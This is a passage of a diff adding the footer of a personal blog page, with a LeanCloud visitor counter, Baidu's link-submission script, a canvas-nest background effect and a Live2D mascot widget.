+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+  <script type="text/javascript" color="255,0,204" opacity='0.5' zIndex="-2" count="80" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+
+
+
+
+
+<!--卖萌-->
+<script type="text/javascript" src="/js/src/dytitle.js"></script>
+</div></footer></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"superSample":2,"width":200,"height":300,"position":"left"},"mobile":{"show":true},"react":{"opacityDefault":0.9,"opacityOnHover":0.5},"log":false});</script></body>
+</html>
